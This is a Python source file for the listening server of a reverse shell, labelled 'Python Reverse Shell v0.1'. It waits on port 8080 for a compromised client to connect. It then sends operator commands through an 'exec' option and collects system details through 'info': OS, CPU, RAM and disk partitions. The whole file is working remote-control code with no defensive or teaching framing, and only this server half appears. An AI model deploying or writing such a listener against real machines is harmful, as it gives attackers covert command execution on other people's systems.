import socket
import sys

class RpyShellServ:
    def __init__(self, host="0.0.0.0", port=8080):
        self.host = host
        self.port = port
        self.bufsize = 1024 * 128 # 128KB
        self.con = self.startServer()

    # Bind the socket and listen
    def startServer(self):
        print(f">> Python Reverse Shell v0.1 - cloud (http://www.madpowah.org)")
        try:
            s = socket.socket()
            s.bind((self.host, self.port))
            s.listen(5)
            print(f">> Listening host:port {self.host}:{self.port} ...")
        except:
            exit('Error bind/listen on startServer')
        # accept any connections attempted
        client_socket, client_address = s.accept()
        print(f"[+] {client_address[0]}:{client_address[1]} connected.")

        return client_socket

    # Method which prints client informations (list)
    def printClientInfo(self, info):
        print("[+] OS detection:", info[0])
        print("[+] CPU number:", info[1])       
        print(f"[+] CPU frequency: {info[2]} Mhz")
        print(f"[+] RAM: {info[3]} Go")
        print(f"[+] Partitions: {info[4]}")

    #The loop to send and receive information with the client
    def loop(self):
        while True:
            # We add an input to send commands on the client
            sys.stdout.write('$ ')
            sys.stdout.flush()
            tmp_input = input()
            # we send the command
            self.con.send(tmp_input.encode())
            # we wait the return of the client
            msg_recv = self.con.recv(self.bufsize).decode().split('<S>')
            # To exit properly
            if tmp_input == "exit" or tmp_input == "quit":
                print('>>> Exiting ...')
                break
            # if we send 'info', we format the return
            if tmp_input == 'info':
                self.printClientInfo(msg_recv)
            # if we send 'exec <command>', we print the return
            if tmp_input.startswith('exec'):
                print(f"{msg_recv[0]}")


def main():
    serv = RpyShellServ()
    serv.loop()

if __name__ == "__main__":
    main()